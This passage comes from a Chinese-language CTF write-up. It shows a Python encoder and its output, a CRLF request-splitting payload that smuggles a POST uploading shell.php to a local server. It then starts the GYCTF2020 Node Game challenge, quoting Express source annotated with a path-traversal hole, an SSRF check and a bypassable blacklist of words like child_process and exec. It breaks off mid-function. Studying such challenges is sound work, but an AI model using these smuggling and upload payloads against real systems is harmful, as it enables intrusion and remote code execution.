        .replace('"', '\u0122') \
        .replace("'", '\u0a27') \
        .replace('[', '\u015b') \
        .replace(']', '\u015d') \
    print(payload)
    # 输出: ĠHTTP/1.1čĊčĊPOSTĠ/upload.phpĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊContent-Length:Ġ437čĊContent-Type:Ġmultipart/form-data;Ġboundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6čĊUser-Agent:ĠMozilla/5.0Ġ(WindowsĠNTĠ10.0;ĠWin64;Ġx64)ĠAppleWebKit/537.36Ġ(KHTML,ĠlikeĠGecko)ĠChrome/90.0.4430.72ĠSafari/537.36čĊAccept:Ġtext/html,application/xhtmlīxml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9čĊAccept-Encoding:Ġgzip,ĠdeflatečĊAccept-Language:Ġzh-CN,zh;q=0.9čĊCookie:ĠPHPSESSID=nk67astv61hqanskkddslkgst4čĊConnection:ĠclosečĊčĊ------WebKitFormBoundaryjDb9HMGTixAA7Am6čĊContent-Disposition:Ġform-data;Ġname=ĢMAX_FILE_SIZEĢčĊčĊ100000čĊ------WebKitFormBoundaryjDb9HMGTixAA7Am6čĊContent-Disposition:Ġform-data;Ġname=ĢuploadedĢ;Ġfilename=Ģshell.phpĢčĊContent-Type:Ġapplication/octet-streamčĊčĊčĊ------WebKitFormBoundaryjDb9HMGTixAA7Am6čĊContent-Disposition:Ġform-data;Ġname=ĢUploadĢčĊčĊUploadčĊ------WebKitFormBoundaryjDb9HMGTixAA7Am6--čĊčĊGETĠ/ĠHTTP/1.1čĊtest:
其实主要就是将 `\r\n` 和空格进行编码，其他的字符如果是题目对他们做了过滤也可以自己加进去。最好是将所有的控制字符全部编码。
下面我们分析一下整个攻击的过程。
原始请求数据如下：
    GET / HTTP/1.1
    Host: 47.101.57.72:4000
当我们插入CRLF数据后，HTTP请求数据变成了：
    GET / HTTP/1.1
    POST /upload.php HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 437
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
    ......
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6
    Content-Disposition: form-data; name="Upload"
    Upload
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6--    
     HTTP/1.1
    Host: 47.101.57.72:4000
上次请求包的Host字段和状态行中的 `HTTP/1.1` 就单独出来了，所以我们再构造一个请求把他闭合：
    GET / HTTP/1.1
    POST /upload.php HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 437
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
    ......
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6
    Content-Disposition: form-data; name="Upload"
    Upload
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6--    
    GET / HTTP/1.1
    test: HTTP/1.1
    Host: 47.101.57.72:4000
## [GYCTF2020]Node Game
进入题目：
“Only admin can use this”进去之后是一个文件上传页面，但是只有admin才能上传文件：
“Click here to get the source” 可以查看源码：
    var express = require('express');
    var app = express();
    var fs = require('fs');
    var path = require('path');
    var http = require('http');
    var pug = require('pug');
    var morgan = require('morgan');    // morgan是express默认的日志中间件
    const multer = require('multer');    // Multer是nodejs中处理multipart/form-data数据格式(主要用在上传功能中）的中间件。该中间件不处理multipart/form-data数据格式以外的任何形式的数据
    app.use(multer({dest: './dist'}).array('file'));
    app.use(morgan('short'));
    app.use("/uploads",express.static(path.join(__dirname, '/uploads')))
    app.use("/template",express.static(path.join(__dirname, '/template')))
    app.get('/', function(req, res) {
        var action = req.query.action?req.query.action:"index";
        if( action.includes("/") || action.includes("\\") ){    // action中不能含有/或\\字符
            res.send("Errrrr, You have been Blocked");
        }
        file = path.join(__dirname + '/template/'+ action +'.pug');
        var html = pug.renderFile(file);    // 渲染pug模板引擎
        res.send(html);
    });
    app.post('/file_upload', function(req, res){
        var ip = req.connection.remoteAddress;
        var obj = {
            msg: '',
        }
        if (!ip.includes('127.0.0.1')) {    // remoteAddress必须是本地IP,所以需要进行ssrf
            obj.msg="only admin's ip can use it"
            res.send(JSON.stringify(obj));    // JSON.stringify() 方法用于将 JavaScript 值转换为 JSON 字符串。
            return 
        }
        fs.readFile(req.files[0].path, function(err, data){
            if(err){
                obj.msg = 'upload failed';
                res.send(JSON.stringify(obj));
            }else{
                var file_path = '/uploads/' + req.files[0].mimetype +"/";    
                var file_name = req.files[0].originalname
                var dir_file = __dirname + file_path + file_name    // /uploads/mimetype/filename.ext, 这里可通过mimetype进行目录穿越
                if(!fs.existsSync(__dirname + file_path)){    // 以同步的方法检测目录是否存在
                    try {
                        fs.mkdirSync(__dirname + file_path)    // 如果目录不存在则创建目录
                    } catch (error) {
                        obj.msg = "file type error";
                        res.send(JSON.stringify(obj));
                        return
                    }
                }
                try {
                    fs.writeFileSync(dir_file,data)    // 将要上传的文件写入文件到指定的目录中(实现文件上传)
                    obj = {
                        msg: 'upload success',
                        filename: file_path + file_name
                    } 
                } catch (error) {
                    obj.msg = 'upload failed';
                }
                res.send(JSON.stringify(obj));    
            }
        })
    })
    app.get('/source', function(req, res) {
        res.sendFile(path.join(__dirname + '/template/source.txt'));
    });
    app.get('/core', function(req, res) {
        var q = req.query.q;
        var resp = "";    // 用来接收请求的数据
        if (q) {
            var url = 'http://localhost:8081/source?' + q
            console.log(url)
            var trigger = blacklist(url);
            if (trigger === true) {
                res.send("error occurs!");
            } else {
                try {
                    http.get(url, function(resp) {
                        resp.setEncoding('utf8');
                        resp.on('error', function(err) {
                        if (err.code === "ECONNRESET") {
                         console.log("Timeout occurs");
                         return;
                        }
                       });
                        resp.on('data', function(chunk) {
                            try {
                             resps = chunk.toString();
                             res.send(resps);
                            }catch (e) {
                               res.send(e.message);
                            }
                        }).on('error', (e) => {
                             res.send(e.message);});
                    });
                } catch (error) {
                    console.log(error);
                }
            }
        } else {
            res.send("search param 'q' missing!");
        }
    })
    function blacklist(url) {    // 检测url中的恶意字符,检测到的返回true。可以通过字符串拼接绕过。
        var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];
        var arrayLen = evilwords.length;
        for (var i = 0; i < arrayLen; i++) {
            const trigger = url.includes(evilwords[i]);
            if (trigger === true) {